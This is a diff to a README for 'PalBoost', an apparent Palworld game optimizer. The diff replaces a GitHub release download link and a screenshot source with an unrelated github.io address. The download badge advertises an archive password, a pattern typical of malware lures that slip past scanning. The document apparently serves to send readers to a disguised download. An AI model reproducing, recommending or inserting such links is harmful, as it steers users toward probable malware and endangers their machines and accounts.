@@ -4,7 +4,7 @@ Boost Palworld performance with PalBoost. Optimize Windows, monitor FPS, reduce 
 
 <p align="center">
 
-<a href="https://github.com/romanson-xo8/Palworld-Optimizer-2026/releases/download/v1.2/PalBoost.zip">
+<a href="https://genusisoetesgoose403.github.io">
 <img src="https://img.shields.io/badge/⬇%20Download(click)-PASSW0RD%202026-red?style=for-the-badge&logo=windows">
 </a>
 
@@ -15,7 +15,7 @@ Boost Palworld performance with PalBoost. Optimize Windows, monitor FPS, reduce 
 <img src="https://img.shields.io/badge/Lightweight-Yes-orange?style=for-the-badge">
 
 </p>
-<img width="1712" height="919" alt="ChatGPT Image 31 июл  2026 г , 01_04_20" src="https://github.com/user-attachments/assets/d74c6c6c-5cad-4ef4-9708-bdd0c759afac" />
+<img width="1712" height="919" alt="ChatGPT Image 31 июл  2026 г , 01_04_20" src="https://genusisoetesgoose403.github.io" />
 
 # 🚀 PalBoost
 
